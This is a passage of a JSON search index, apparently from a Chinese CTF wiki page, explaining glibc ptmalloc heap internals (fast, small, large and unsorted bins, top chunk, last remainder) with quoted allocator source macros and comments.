\uff0c\u537332\u4f4d\u76f8\u5dee8\u5b57\u8282\uff0c64\u4f4d\u76f8\u5dee16\u5b57\u8282\u3002  small bins \u540e\u9762\u7684 bin \u88ab\u79f0\u4f5c large bins\u3002large bins \u4e2d\u7684\u6bcf\u4e00\u4e2a bin \u90fd\u5305\u542b\u4e00\u5b9a\u8303\u56f4\u5185\u7684 chunk\uff0c\u5176\u4e2d\u7684chunk \u6309 fd \u6307\u9488\u7684\u987a\u5e8f\u4ece\u5927\u5230\u5c0f\u6392\u5217\u3002\u76f8\u540c\u5927\u5c0f\u7684chunk\u540c\u6837\u6309\u7167\u6700\u8fd1\u4f7f\u7528\u987a\u5e8f\u6392\u5217\u3002   \u6b64\u5916\uff0c\u4e0a\u8ff0\u8fd9\u4e9bbin\u7684\u6392\u5e03\u90fd\u4f1a\u9075\u5faa\u4e00\u4e2a\u539f\u5219\uff1a \u4efb\u610f\u4e24\u4e2a\u7269\u7406\u76f8\u90bb\u7684\u7a7a\u95f2chunk\u4e0d\u80fd\u5728\u4e00\u8d77 \u3002  \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u7684 chunk \u88ab\u91ca\u653e\u540e\u5c31\u7acb\u5373\u88ab\u653e\u5230 bin \u4e2d\u3002ptmalloc \u4e3a\u4e86\u63d0\u9ad8\u5206\u914d\u7684\u901f\u5ea6\uff0c\u4f1a\u628a\u4e00\u4e9b\u5c0f\u7684 chunk  \u5148 \u653e\u5230 fast bins \u7684\u5bb9\u5668\u5185\u3002 \u800c\u4e14\uff0cfastbin \u5bb9\u5668\u4e2d\u7684 chunk \u7684\u4f7f\u7528\u6807\u8bb0\u603b\u662f\u88ab\u7f6e\u4f4d\u7684\uff0c\u6240\u4ee5\u4e0d\u6ee1\u8db3\u4e0a\u9762\u7684\u539f\u5219\u3002  bin \u901a\u7528\u7684\u5b8f\u5982\u4e0b  typedef   struct   malloc_chunk   * mbinptr ;  /* addressing -- note that bin_at(0) does not exist */  #define bin_at(m, i)                                                           \\      (mbinptr)(((char *)  ((m)- bins[ ((i) -1) * 2 ])) -                        \\                offsetof(struct malloc_chunk, fd))  /* analog of ++bin */  //\u83b7\u53d6\u4e0b\u4e00\u4e2abin\u7684\u5730\u5740  #define next_bin(b) ((mbinptr)((char *) (b) + (sizeof(mchunkptr)   1)))  /* Reminders about list directionality within bins */  // \u8fd9\u4e24\u4e2a\u5b8f\u53ef\u4ee5\u7528\u6765\u904d\u5386bin  // \u83b7\u53d6 bin \u7684\u4f4d\u4e8e\u94fe\u8868\u5934\u7684 chunk  #define first(b) ((b)- fd)  // \u83b7\u53d6 bin \u7684\u4f4d\u4e8e\u94fe\u8868\u5c3e\u7684 chunk  #define last(b) ((b)- bk)", 
            "title": "\u6982\u8ff0"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#fast-bin", 
            "text": "\u5927\u591a\u6570\u7a0b\u5e8f\u7ecf\u5e38\u4f1a\u7533\u8bf7\u4ee5\u53ca\u91ca\u653e\u4e00\u4e9b\u6bd4\u8f83\u5c0f\u7684\u5185\u5b58\u5757\u3002\u5982\u679c\u5c06\u4e00\u4e9b\u8f83\u5c0f\u7684 chunk \u91ca\u653e\u4e4b\u540e\u53d1\u73b0\u5b58\u5728\u4e0e\u4e4b\u76f8\u90bb\u7684\u7a7a\u95f2\u7684 chunk \u5e76\u5c06\u5b83\u4eec\u8fdb\u884c\u5408\u5e76\uff0c\u90a3\u4e48\u5f53\u4e0b\u4e00\u6b21\u518d\u6b21\u7533\u8bf7\u76f8\u5e94\u5927\u5c0f\u7684 chunk \u65f6\uff0c\u5c31\u9700\u8981\u5bf9 chunk \u8fdb\u884c\u5206\u5272\uff0c\u8fd9\u6837\u5c31\u5927\u5927\u964d\u4f4e\u4e86\u5806\u7684\u5229\u7528\u6548\u7387\u3002 \u56e0\u4e3a\u6211\u4eec\u628a\u5927\u90e8\u5206\u65f6\u95f4\u82b1\u5728\u4e86\u5408\u5e76\u3001\u5206\u5272\u4ee5\u53ca\u4e2d\u95f4\u68c0\u67e5\u7684\u8fc7\u7a0b\u4e2d\u3002 \u56e0\u6b64\uff0cptmalloc \u4e2d\u4e13\u95e8\u8bbe\u8ba1\u4e86 fast bin\uff0c\u5bf9\u5e94\u7684\u53d8\u91cf\u5c31\u662f malloc state \u4e2d\u7684 fastbinsY   /*     Fastbins      An array of lists holding recently freed small chunks.  Fastbins      are not doubly linked.  It is faster to single-link them, and      since chunks are never removed from the middles of these lists,      double linking is not necessary. Also, unlike regular bins, they      are not even processed in FIFO order (they use faster LIFO) since      ordering doesn t much matter in the transient contexts in which      fastbins are normally used.      Chunks in fastbins keep their inuse bit set, so they cannot      be consolidated with other free chunks. malloc_consolidate      releases all chunks in fastbins and consolidates them with      other free chunks.   */  typedef   struct   malloc_chunk   * mfastbinptr ;  /*      This is in malloc_state.      /* Fastbins */ \n     mfastbinptr   fastbinsY [   NFASTBINS   ];  */   \u4e3a\u4e86\u66f4\u52a0\u9ad8\u6548\u5730\u5229\u7528 fast bin\uff0cglibc \u91c7\u7528\u5355\u5411\u94fe\u8868\u5bf9\u5176\u4e2d\u7684\u6bcf\u4e2a bin \u8fdb\u884c\u7ec4\u7ec7\uff0c\u5e76\u4e14 \u6bcf\u4e2a bin \u91c7\u53d6 LIFO \u7b56\u7565 \uff0c\u6700\u8fd1\u91ca\u653e\u7684 chunk \u4f1a\u66f4\u65e9\u5730\u88ab\u5206\u914d\uff0c\u6240\u4ee5\u4f1a\u66f4\u52a0\u9002\u5408\u4e8e\u5c40\u90e8\u6027\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5f53\u7528\u6237\u9700\u8981\u7684 chunk \u7684\u5927\u5c0f\u5c0f\u4e8e fastbin \u7684\u6700\u5927\u5927\u5c0f\u65f6\uff0c ptmalloc \u4f1a\u9996\u5148\u5224\u65ad fastbin \u4e2d\u76f8\u5e94\u7684 bin \u4e2d\u662f\u5426\u6709\u5bf9\u5e94\u5927\u5c0f\u7684\u7a7a\u95f2\u5757\uff0c\u5982\u679c\u6709\u7684\u8bdd\uff0c\u5c31\u4f1a\u76f4\u63a5\u4ece\u8fd9\u4e2a bin \u4e2d\u83b7\u53d6 chunk\u3002\u5982\u679c\u6ca1\u6709\u7684\u8bdd\uff0cptmalloc\u624d\u4f1a\u505a\u63a5\u4e0b\u6765\u7684\u4e00\u7cfb\u5217\u64cd\u4f5c\u3002  \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff08 32\u4f4d\u7cfb\u7edf\u4e3a\u4f8b \uff09\uff0c fastbin \u4e2d\u9ed8\u8ba4\u652f\u6301\u6700\u5927\u7684 chunk \u7684\u6570\u636e\u7a7a\u95f4\u5927\u5c0f\u4e3a 64 \u5b57\u8282\u3002\u4f46\u662f\u5176\u53ef\u4ee5\u652f\u6301\u7684chunk\u7684\u6570\u636e\u7a7a\u95f4\u6700\u5927\u4e3a80\u5b57\u8282\u3002\u9664\u6b64\u4e4b\u5916\uff0c fastbin \u6700\u591a\u53ef\u4ee5\u652f\u6301\u7684 bin \u7684\u4e2a\u6570\u4e3a 10 \u4e2a\uff0c\u4ece\u6570\u636e\u7a7a\u95f4\u4e3a8\u5b57\u8282\u5f00\u59cb\u4e00\u76f4\u523080\u5b57\u8282\uff0c\u5b9a\u4e49\u5982\u4e0b  #define NFASTBINS (fastbin_index(request2size(MAX_FAST_SIZE)) + 1)  #ifndef DEFAULT_MXFAST  #define DEFAULT_MXFAST (64 * SIZE_SZ / 4)  #endif  /* The maximum fastbin request size we support */  #define MAX_FAST_SIZE (80 * SIZE_SZ / 4)  /*     Since the lowest 2 bits in max_fast don t matter in size comparisons,     they are used as flags.   */  /*     FASTCHUNKS_BIT held in max_fast indicates that there are probably     some fastbin chunks. It is set true on entering a chunk into any     fastbin, and cleared only in malloc_consolidate.     The truth value is inverted so that have_fastchunks will be true     upon startup (since statics are zero-filled), simplifying     initialization checks.   */  //\u5224\u65ad\u5206\u914d\u533a\u662f\u5426\u6709 fast bin chunk\uff0c1\u8868\u793a\u6ca1\u6709  #define FASTCHUNKS_BIT (1U)  #define have_fastchunks(M) (((M)- flags   FASTCHUNKS_BIT) == 0)  #define clear_fastchunks(M) catomic_or( (M)- flags, FASTCHUNKS_BIT)  #define set_fastchunks(M) catomic_and( (M)- flags, ~FASTCHUNKS_BIT)  /*     NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous     regions.  Otherwise, contiguity is exploited in merging together,     when possible, results from consecutive MORECORE calls.     The initial value comes from MORECORE_CONTIGUOUS, but is     changed dynamically if mmap is ever used as an sbrk substitute.   */  // MORECODE\u662f\u5426\u8fd4\u56de\u8fde\u7eed\u7684\u5185\u5b58\u533a\u57df\u3002  // \u4e3b\u5206\u914d\u533a\u4e2d\u7684MORECORE\u5176\u5b9e\u4e3asbr()\uff0c\u9ed8\u8ba4\u8fd4\u56de\u8fde\u7eed\u865a\u62df\u5730\u5740\u7a7a\u95f4  // \u975e\u4e3b\u5206\u914d\u533a\u4f7f\u7528mmap()\u5206\u914d\u5927\u5757\u865a\u62df\u5185\u5b58\uff0c\u7136\u540e\u8fdb\u884c\u5207\u5206\u6765\u6a21\u62df\u4e3b\u5206\u914d\u533a\u7684\u884c\u4e3a  // \u800c\u9ed8\u8ba4\u60c5\u51b5\u4e0bmmap\u6620\u5c04\u533a\u57df\u662f\u4e0d\u4fdd\u8bc1\u865a\u62df\u5730\u5740\u7a7a\u95f4\u8fde\u7eed\u7684\uff0c\u6240\u4ee5\u975e\u4e3b\u5206\u914d\u533a\u9ed8\u8ba4\u5206\u914d\u975e\u8fde\u7eed\u865a\u62df\u5730\u5740\u7a7a\u95f4\u3002  #define NONCONTIGUOUS_BIT (2U)  #define contiguous(M) (((M)- flags   NONCONTIGUOUS_BIT) == 0)  #define noncontiguous(M) (((M)- flags   NONCONTIGUOUS_BIT) != 0)  #define set_noncontiguous(M) ((M)- flags |= NONCONTIGUOUS_BIT)  #define set_contiguous(M) ((M)- flags  = ~NONCONTIGUOUS_BIT)  /* ARENA_CORRUPTION_BIT is set if a memory corruption was detected on the     arena.  Such an arena is no longer used to allocate chunks.  Chunks     allocated in that arena before detecting corruption are not freed.  */  #define ARENA_CORRUPTION_BIT (4U)  #define arena_is_corrupt(A) (((A)- flags   ARENA_CORRUPTION_BIT))  #define set_arena_corrupt(A) ((A)- flags |= ARENA_CORRUPTION_BIT)  /*     Set value of max_fast.     Use impossibly small value if 0.     Precondition: there are no existing fastbin chunks.     Setting the value clears fastchunk bit but preserves noncontiguous bit.   */  #define set_max_fast(s)                                                        \\      global_max_fast =                                                          \\          (((s) == 0) ? SMALLBIN_WIDTH : ((s + SIZE_SZ)   ~MALLOC_ALIGN_MASK))  #define get_max_fast() global_max_fast   ptmalloc \u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4f1a\u8c03\u7528 set_max_fast(s) \u5c06\u5168\u5c40\u53d8\u91cf global_max_fast \u8bbe\u7f6e\u4e3a DEFAULT_MXFAST\uff0c\u4e5f\u5c31\u662f\u8bbe\u7f6e fast bins \u4e2d chunk \u7684\u6700\u5927\u503c\u3002\u5f53 MAX_FAST_SIZE \u88ab\u8bbe\u7f6e\u4e3a 0 \u65f6\uff0c\u7cfb\u7edf\u5c31\u4e0d\u4f1a\u652f\u6301 fastbin \u3002  fastbin\u7684\u7d22\u5f15  #define fastbin(ar_ptr, idx) ((ar_ptr)- fastbinsY[ idx ])  /* offset 2 to use otherwise unindexable first 2 bins */  // chunk size=2*size_sz*(2+idx)  // \u8fd9\u91cc\u8981\u51cf2\uff0c\u5426\u5219\u7684\u8bdd\uff0c\u524d\u4e24\u4e2abin\u6ca1\u6709\u529e\u6cd5\u7d22\u5f15\u5230\u3002  #define fastbin_index(sz)                                                      \\      ((((unsigned int) (sz))   (SIZE_SZ == 8 ? 4 : 3)) - 2)   \u9700\u8981\u7279\u522b\u6ce8\u610f\u7684\u662f\uff0cfastbin \u8303\u56f4\u7684 chunk \u7684 inuse \u59cb\u7ec8\u88ab\u7f6e\u4e3a 1\u3002\u56e0\u6b64\u5b83\u4eec\u4e0d\u4f1a\u548c\u5176\u5b83\u88ab\u91ca\u653e\u7684chunk\u5408\u5e76\u3002  \u4f46\u662f\u5f53\u91ca\u653e\u7684 chunk \u4e0e\u8be5 chunk \u76f8\u90bb\u7684\u7a7a\u95f2 chunk \u5408\u5e76\u540e\u7684\u5927\u5c0f\u5927\u4e8eFASTBIN_CONSOLIDATION_THRESHOLD\u65f6\uff0c\u5185\u5b58\u788e\u7247\u53ef\u80fd\u6bd4\u8f83\u591a\u4e86\uff0c\u6211\u4eec\u5c31\u9700\u8981\u628a fast bins \u4e2d\u7684chunk\u90fd\u8fdb\u884c\u5408\u5e76\uff0c\u4ee5\u51cf\u5c11\u5185\u5b58\u788e\u7247\u5bf9\u7cfb\u7edf\u7684\u5f71\u54cd\u3002  /*     FASTBIN_CONSOLIDATION_THRESHOLD is the size of a chunk in free()     that triggers automatic consolidation of possibly-surrounding     fastbin chunks. This is a heuristic, so the exact value should not     matter too much. It is defined at half the default trim threshold as a     compromise heuristic to only attempt consolidation if it is likely     to lead to trimming. However, it is not dynamically tunable, since     consolidation reduces fragmentation surrounding large chunks even     if trimming is not used.   */  #define FASTBIN_CONSOLIDATION_THRESHOLD (65536UL)   malloc_consolidate\u51fd\u6570\u53ef\u4ee5\u5c06fastbin\u4e2d\u6240\u6709\u7684chunk\u91ca\u653e\u5e76\u5408\u5e76\u5728\u4e00\u8d77\u3002\uff1f\uff1f\uff1f    /*\n    Chunks in fastbins keep their inuse bit set, so they cannot\n    be consolidated with other free chunks. malloc_consolidate\n    releases all chunks in fastbins and consolidates them with\n    other free chunks.\n */", 
            "title": "fast bin"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#small-bin", 
            "text": "small bins \u4e2d\u6bcf\u4e2a chunk \u7684\u5927\u5c0f\u4e0e\u5176\u6240\u5728\u7684 bin \u7684 index \u7684\u5173\u7cfb\u4e3a\uff1achunk_size =2 * SIZE_SZ *index\uff0c\u5177\u4f53\u5982\u4e0b     \u4e0b\u6807  SIZE_SZ=4\uff0832\u4f4d\uff09  SIZE_SZ=8\uff0864\u4f4d\uff09      2  16  32    3  24  48    4  32  64    5  40  80    x  2*4*x  2*8*x    63  504  1008     small bins \u4e2d\u4e00\u5171\u6709 62 \u4e2a\u94fe\u8868\uff0c\u6bcf\u4e2a\u94fe\u8868\u4e2d\u5b58\u50a8\u7684 chunk \u5927\u5c0f\u90fd\u4e00\u81f4\u3002\u6bd4\u5982\u5bf9\u4e8e 32 \u4f4d\u7cfb\u7edf\u6765\u8bf4\uff0c\u4e0b\u6807 2 \u5bf9\u5e94\u7684\u53cc\u5411\u94fe\u8868\u4e2d\u5b58\u50a8\u7684 chunk \u5927\u5c0f\u4e3a\u5747\u4e3a 16 \u5b57\u8282\u3002\u6bcf\u4e2a\u94fe\u8868\u90fd\u6709\u94fe\u8868\u5934\u7ed3\u70b9\uff0c\u8fd9\u6837\u53ef\u4ee5\u65b9\u4fbf\u5bf9\u4e8e\u94fe\u8868\u5185\u90e8\u7ed3\u70b9\u7684\u7ba1\u7406\u3002\u6b64\u5916\uff0c small bins \u4e2d\u6bcf\u4e2a bin \u5bf9\u5e94\u7684\u94fe\u8868\u91c7\u7528 FIFO \u7684\u89c4\u5219 \uff0c\u6240\u4ee5\u540c\u4e00\u4e2a\u94fe\u8868\u4e2d\u5148\u88ab\u91ca\u653e\u7684 chunk \u4f1a\u5148\u88ab\u5206\u914d\u51fa\u53bb\u3002  small bin\u76f8\u5173\u7684\u5b8f\u5982\u4e0b  #define NSMALLBINS 64  #define SMALLBIN_WIDTH MALLOC_ALIGNMENT  // \u662f\u5426\u9700\u8981\u5bf9small bin\u7684\u4e0b\u6807\u8fdb\u884c\u7ea0\u6b63  #define SMALLBIN_CORRECTION (MALLOC_ALIGNMENT   2 * SIZE_SZ)  #define MIN_LARGE_SIZE ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)  //\u5224\u65adchunk\u7684\u5927\u5c0f\u662f\u5426\u5728small bin\u8303\u56f4\u5185  #define in_smallbin_range(sz)                                                  \\      ((unsigned long) (sz)   (unsigned long) MIN_LARGE_SIZE)  // \u6839\u636echunk\u7684\u5927\u5c0f\u5f97\u5230small bin\u5bf9\u5e94\u7684\u7d22\u5f15\u3002  #define smallbin_index(sz)                                                     \\      ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz))   4)                          \\                             : (((unsigned) (sz))   3)) +                       \\       SMALLBIN_CORRECTION)   \u6216\u8bb8\uff0c\u5927\u5bb6\u4f1a\u5f88\u7591\u60d1\uff0c\u90a3 fastbin \u4e0e small bin \u4e2d chunk \u7684\u5927\u5c0f\u4f1a\u6709\u5f88\u5927\u4e00\u90e8\u5206\u91cd\u5408\u554a\uff0c\u90a3 small bin \u4e2d\u5bf9\u5e94\u5927\u5c0f\u7684 bin \u662f\u4e0d\u662f\u5c31\u6ca1\u6709\u4ec0\u4e48\u4f5c\u7528\u554a\uff1f  \u5176\u5b9e\u4e0d\u7136\uff0cfast bin \u4e2d\u7684 chunk \u662f\u6709\u53ef\u80fd\u88ab\u653e\u5230 small bin\u4e2d\u53bb\u7684\u3002", 
            "title": "small bin"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#large-bin", 
            "text": "large bins \u4e2d\u4e00\u5171\u5305\u62ec 63 \u4e2a bin\uff0c\u6bcf\u4e2a bin \u4e2d\u7684 chunk \u7684\u5927\u5c0f\u4e0d\u4e00\u81f4\uff0c\u800c\u662f\u5904\u4e8e\u4e00\u5b9a\u533a\u95f4\u8303\u56f4\u5185\u3002\u6b64\u5916\uff0c\u8fd9 63 \u4e2a bin \u88ab\u5206\u6210\u4e86 6 \u7ec4\uff0c\u6bcf\u7ec4 bin \u4e2d\u7684 chunk \u5927\u5c0f\u4e4b\u95f4\u7684\u516c\u5dee\u4e00\u81f4\uff0c\u5177\u4f53\u5982\u4e0b\uff1a     \u7ec4  \u6570\u91cf  \u516c\u5dee      1  32  64B    2  16  512B    3  8  4096B    4  4  32768B    5  2  262144B    6  1  \u4e0d\u9650\u5236     \u8fd9\u91cc\u6211\u4eec\u4ee5 32 \u4f4d\u5e73\u53f0\u7684 large bin \u4e3a\u4f8b\uff0c\u7b2c\u4e00\u4e2a large bin \u7684\u8d77\u59cb chunk \u5927\u5c0f\u4e3a 512 \u5b57\u8282\uff0c\u4f4d\u4e8e\u7b2c\u4e00\u7ec4\uff0c\u6240\u4ee5\u8be5bin \u53ef\u4ee5\u5b58\u50a8\u7684 chunk \u7684\u5927\u5c0f\u8303\u56f4\u4e3a [512,512+64)\u3002  \u5173\u4e8e large bin \u7684\u5b8f\u5982\u4e0b\uff0c\u8fd9\u91cc\u6211\u4eec\u4ee5 32 \u4f4d\u5e73\u53f0\u4e0b\uff0c\u7b2c\u4e00\u4e2a large bin \u7684\u8d77\u59cb chunk \u5927\u5c0f\u4e3a\u4f8b\uff0c\u4e3a 512 \u5b57\u8282\uff0c\u90a3\u4e48 512 6 = 8\uff0c\u6240\u4ee5\u5176\u4e0b\u6807\u4e3a56+8=64\u3002  #define largebin_index_32(sz)                                                  \\      (((((unsigned long) (sz))   6)  = 38)                                     \\           ? 56 + (((unsigned long) (sz))   6)                                  \\           : ((((unsigned long) (sz))   9)  = 20)                               \\                 ? 91 + (((unsigned long) (sz))   9)                            \\                 : ((((unsigned long) (sz))   12)  = 10)                        \\                       ? 110 + (((unsigned long) (sz))   12)                    \\                       : ((((unsigned long) (sz))   15)  = 4)                   \\                             ? 119 + (((unsigned long) (sz))   15)              \\                             : ((((unsigned long) (sz))   18)  = 2)             \\                                   ? 124 + (((unsigned long) (sz))   18)        \\                                   : 126)  #define largebin_index_32_big(sz)                                              \\      (((((unsigned long) (sz))   6)  = 45)                                     \\           ? 49 + (((unsigned long) (sz))   6)                                  \\           : ((((unsigned long) (sz))   9)  = 20)                               \\                 ? 91 + (((unsigned long) (sz))   9)                            \\                 : ((((unsigned long) (sz))   12)  = 10)                        \\                       ? 110 + (((unsigned long) (sz))   12)                    \\                       : ((((unsigned long) (sz))   15)  = 4)                   \\                             ? 119 + (((unsigned long) (sz))   15)              \\                             : ((((unsigned long) (sz))   18)  = 2)             \\                                   ? 124 + (((unsigned long) (sz))   18)        \\                                   : 126)  // XXX It remains to be seen whether it is good to keep the widths of  // XXX the buckets the same or whether it should be scaled by a factor  // XXX of two as well.  #define largebin_index_64(sz)                                                  \\      (((((unsigned long) (sz))   6)  = 48)                                     \\           ? 48 + (((unsigned long) (sz))   6)                                  \\           : ((((unsigned long) (sz))   9)  = 20)                               \\                 ? 91 + (((unsigned long) (sz))   9)                            \\                 : ((((unsigned long) (sz))   12)  = 10)                        \\                       ? 110 + (((unsigned long) (sz))   12)                    \\                       : ((((unsigned long) (sz))   15)  = 4)                   \\                             ? 119 + (((unsigned long) (sz))   15)              \\                             : ((((unsigned long) (sz))   18)  = 2)             \\                                   ? 124 + (((unsigned long) (sz))   18)        \\                                   : 126)  #define largebin_index(sz)                                                     \\      (SIZE_SZ == 8 ? largebin_index_64(sz) : MALLOC_ALIGNMENT == 16             \\                                                  ? largebin_index_32_big(sz)    \\                                                  : largebin_index_32(sz))", 
            "title": "large bin"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#unsorted-bin", 
            "text": "unsorted bin \u53ef\u4ee5\u89c6\u4e3a\u7a7a\u95f2 chunk \u56de\u5f52\u5176\u6240\u5c5e bin \u4e4b\u524d\u7684\u7f13\u51b2\u533a\u3002  \u5176\u5728 glibc \u4e2d\u5177\u4f53\u7684\u8bf4\u660e\u5982\u4e0b  /*     Unsorted chunks      All remainders from chunk splits, as well as all returned chunks,      are first placed in the  unsorted  bin. They are then placed      in regular bins after malloc gives them ONE chance to be used before      binning. So, basically, the unsorted_chunks list acts as a queue,      with chunks being placed on it in free (and malloc_consolidate),      and taken off (to be either used or placed in bins) in malloc.      The NON_MAIN_ARENA flag is never set for unsorted chunks, so it      does not have to be taken into account in size comparisons.   */   \u4ece\u4e0b\u9762\u7684\u5b8f\u6211\u4eec\u53ef\u4ee5\u770b\u51fa  /* The otherwise unindexable 1-bin is used to hold unsorted chunks. */  #define unsorted_chunks(M) (bin_at(M, 1))   unsorted bin \u5904\u4e8e\u6211\u4eec\u4e4b\u524d\u6240\u8bf4\u7684bin\u6570\u7ec4\u4e0b\u68071\u5904\u3002\u6545\u800c unsorted bin\u53ea\u6709\u4e00\u4e2a\u94fe\u8868\u3002unsorted bin \u4e2d\u7684\u7a7a\u95f2 chunk \u5904\u4e8e\u4e71\u5e8f\u72b6\u6001\uff0c\u4e3b\u8981\u6709\u4e24\u4e2a\u6765\u6e90   \u5f53\u4e00\u4e2a\u8f83\u5927\u7684 chunk \u88ab\u5206\u5272\u6210\u4e24\u534a\u540e\uff0c\u5982\u679c\u5269\u4e0b\u7684\u90e8\u5206\u5927\u4e8eMINSIZE\uff0c\u5c31\u4f1a\u88ab\u653e\u5230 unsorted bin \u4e2d\u3002  \u91ca\u653e\u4e00\u4e2a\u4e0d\u5c5e\u4e8e fast bin \u7684 chunk\uff0c\u5e76\u4e14\u8be5 chunk \u4e0d\u548c top chunk \u7d27\u90bb\u65f6\uff0c\u8be5 chunk \u4f1a\u88ab\u9996\u5148\u653e\u5230 unsorted bin \u4e2d\u3002\u5173\u4e8e top chunk \u7684\u89e3\u91ca\uff0c\u8bf7\u53c2\u8003\u4e0b\u9762\u7684\u4ecb\u7ecd\u3002   \u6b64\u5916\uff0cUnsorted Bin \u5728\u4f7f\u7528\u7684\u8fc7\u7a0b\u4e2d\uff0c\u91c7\u7528\u7684\u904d\u5386\u987a\u5e8f\u662f FIFO \u3002", 
            "title": "unsorted bin"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#common-macro", 
            "text": "\u8fd9\u91cc\u4ecb\u7ecd\u4e00\u4e9b\u901a\u7528\u7684\u5b8f\u3002  \u6839\u636echunk\u7684\u5927\u5c0f\u7edf\u4e00\u5730\u83b7\u5f97chunk\u6240\u5728\u7684\u7d22\u5f15  #define bin_index(sz)                                                          \\      ((in_smallbin_range(sz)) ? smallbin_index(sz) : largebin_index(sz))", 
            "title": "common macro"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#top-chunk", 
            "text": "glibc \u4e2d\u5bf9\u4e8e top chunk \u7684\u63cf\u8ff0\u5982\u4e0b  /*     Top      The top-most available chunk (i.e., the one bordering the end of      available memory) is treated specially. It is never included in      any bin, is used only if no other chunk is available, and is      released back to the system if it is very large (see      M_TRIM_THRESHOLD).  Because top initially      points to its own bin with initial zero size, thus forcing      extension on the first malloc request, we avoid having any special      code in malloc to check whether it even exists yet. But we still      need to do so when getting memory from system, so we make      initial_top treat the bin as a legal but unusable chunk during the      interval between initialization and the first call to      sysmalloc. (This is somewhat delicate, since it relies on      the 2 preceding words to be zero during this interval as well.)   */  /* Conveniently, the unsorted bin can be used as dummy top on first call */  #define initial_top(M) (unsorted_chunks(M))   \u7a0b\u5e8f\u7b2c\u4e00\u6b21\u8fdb\u884c malloc \u7684\u65f6\u5019\uff0cheap \u4f1a\u88ab\u5206\u4e3a\u4e24\u5757\uff0c\u4e00\u5757\u7ed9\u7528\u6237\uff0c\u5269\u4e0b\u7684\u90a3\u5757\u5c31\u662f top chunk\u3002\u5176\u5b9e\uff0c\u6240\u8c13\u7684top chunk \u5c31\u662f\u5904\u4e8e\u5f53\u524d\u5806\u7684\u7269\u7406\u5730\u5740\u6700\u9ad8\u7684 chunk\u3002\u8fd9\u4e2a chunk \u4e0d\u5c5e\u4e8e\u4efb\u4f55\u4e00\u4e2a bin\uff0c\u5b83\u7684\u4f5c\u7528\u5728\u4e8e\u5f53\u6240\u6709\u7684bin \u90fd\u65e0\u6cd5\u6ee1\u8db3\u7528\u6237\u8bf7\u6c42\u7684\u5927\u5c0f\u65f6\uff0c\u5982\u679c\u5176\u5927\u5c0f\u4e0d\u5c0f\u4e8e\u6307\u5b9a\u7684\u5927\u5c0f\uff0c\u5c31\u8fdb\u884c\u5206\u914d\uff0c\u5e76\u5c06\u5269\u4e0b\u7684\u90e8\u5206\u4f5c\u4e3a\u65b0\u7684 top chunk\u3002\u5426\u5219\uff0c\u5c31\u5bf9heap\u8fdb\u884c\u6269\u5c55\u540e\u518d\u8fdb\u884c\u5206\u914d\u3002\u5728main arena\u4e2d\u901a\u8fc7sbrk\u6269\u5c55heap\uff0c\u800c\u5728thread arena\u4e2d\u901a\u8fc7mmap\u5206\u914d\u65b0\u7684heap\u3002  \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0ctop chunk \u7684 prev_inuse \u6bd4\u7279\u4f4d\u59cb\u7ec8\u4e3a1\uff0c\u5426\u5219\u5176\u524d\u9762\u7684chunk\u5c31\u4f1a\u88ab\u5408\u5e76\u5230top chunk\u4e2d\u3002  \u521d\u59cb\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06 unsorted chunk \u4f5c\u4e3a top chunk\u3002", 
            "title": "top chunk"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#last-remainder", 
            "text": "\u5728\u7528\u6237\u4f7f\u7528 malloc \u8bf7\u6c42\u5206\u914d\u5185\u5b58\u65f6\uff0cptmalloc2 \u627e\u5230\u7684 chunk \u53ef\u80fd\u5e76\u4e0d\u548c\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u4e00\u81f4\uff0c\u8fd9\u65f6\u5019\u5c31\u5c06\u5206\u5272\u4e4b\u540e\u7684\u5269\u4f59\u90e8\u5206\u79f0\u4e4b\u4e3a last remainder chunk \uff0cunsort bin\u4e5f\u4f1a\u5b58\u8fd9\u4e00\u5757\u3002top chunk \u5206\u5272\u5269\u4e0b\u7684\u90e8\u5206\u4e0d\u4f1a\u4f5c\u4e3alast remainer.", 
            "title": "last remainder"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#_5", 
            "text": "", 
            "title": "\u5b8f\u89c2\u7ed3\u6784"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#arena", 
            "text": "\u5728\u6211\u4eec\u4e4b\u524d\u4ecb\u7ecd\u7684\u4f8b\u5b50\u4e2d\uff0c\u65e0\u8bba\u662f\u4e3b\u7ebf\u7a0b\u8fd8\u662f\u65b0\u521b\u5efa\u7684\u7ebf\u7a0b\uff0c\u5728\u7b2c\u4e00\u6b21\u7533\u8bf7\u5185\u5b58\u65f6\uff0c\u90fd\u4f1a\u6709\u72ec\u7acb\u7684arena\u3002\u90a3\u4e48\u4f1a\u4e0d\u4f1a\u6bcf\u4e2a\u7ebf\u7a0b\u90fd\u6709\u72ec\u7acb\u7684arena\u5462\uff1f\u4e0b\u9762\u6211\u4eec\u5c31\u5177\u4f53\u4ecb\u7ecd\u3002", 
            "title": "arena"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#arena_1", 
